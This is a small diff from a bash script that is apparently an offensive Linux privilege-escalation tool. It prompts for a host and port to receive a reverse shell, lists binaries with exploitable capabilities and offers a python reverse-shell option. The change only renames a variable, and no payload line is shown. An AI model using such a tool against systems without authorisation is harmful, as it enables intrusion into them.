@@ -169,14 +169,14 @@ while true; do
             echo " "
             read -p "Local Host for receiving the Reverse Shell : " LHOST
             read -p "Local Port for receiving the Reverse Shell : " LPORT
-            if [ -z "$ReverseShellCap" ]; then
+            if [ -z "$RevShellCap" ]; then
                 echo "No Vulnerables Binaries with Capabilities detected"
                 continue
             else
-                echo "$ReverseShellCap"
+                echo "$RevShellCap"
             fi
 
-            select choice in $ReverseShellCap "Go Back"; do
+            select choice in $RevShellCap "Go Back"; do
                 case "$choice" in
                     *python*)
                         read "Set up your listener at $LHOST:$LPORT then press enter"
